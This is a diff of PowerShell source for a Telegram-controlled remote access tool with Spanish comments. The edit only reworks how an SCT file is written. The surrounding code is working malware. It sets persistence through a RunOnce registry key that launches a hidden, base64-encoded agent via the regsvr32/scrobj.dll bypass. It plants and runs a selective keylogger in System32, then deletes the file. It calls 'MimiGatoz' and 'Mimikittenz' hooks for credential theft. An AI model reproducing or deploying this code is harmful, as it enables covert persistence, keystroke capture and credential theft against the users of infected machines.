@@ -189,7 +189,7 @@ function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
-crea_plantilla_sct -code $code | Out-File  -Encoding ascii "C:\Windows\System32\update.sct" 
+$plantilla_sct = (crea_plantilla_sct -code $code); $plantilla_sct | Out-File  -Encoding ascii "C:\Windows\System32\update.sct" 
 $key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
 $texto = "Persistencia ejecutada correctamente"} return $texto;break}
 
@@ -277,7 +277,7 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Persistence On") {$texto = persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Persistence Off") {$texto = remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -eq "/KeyLogger_Selective") {$texto = "Activa un KeyLogger de manera selectiva.`n Ejemplo: /KeyLogger_Selective facebook"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/KeyLogger_Selective *") {$comando = $comando -replace "/KeyLogger_Selective ",""; $code = crea_keylogger -extrae $comando ; $code = code_a_base64 -code $code; $code = "powershell.exe -win hidden -enc " + $code ; crea_plantilla_sct -code $code | Out-File -Encoding ascii "C:\windows\system32\log.sct"  ; IEX  'c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 10 ; Remove-Item C:\Windows\System32\log.sct}
+ if ($comando -like "/KeyLogger_Selective *") {$comando = $comando -replace "/KeyLogger_Selective ",""; $code = crea_keylogger -extrae $comando ; $code = code_a_base64 -code $code; $code = "powershell.exe -win hidden -enc " + $code ; $plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\log.sct"  ; IEX  'c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 10 ; Remove-Item C:\Windows\System32\log.sct}
  if ($comando -like "/MimiGatoz") {mimigatoz}
 # if ($comando -eq "Mimikittenz") {$texto = "La funcion mimikitenz se ejecuta: `n /Mimikittenz On`n /Mimikittenz Off"}
  if ($comando -eq "Mimikittenz") {$texto = "Proximamente.."; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
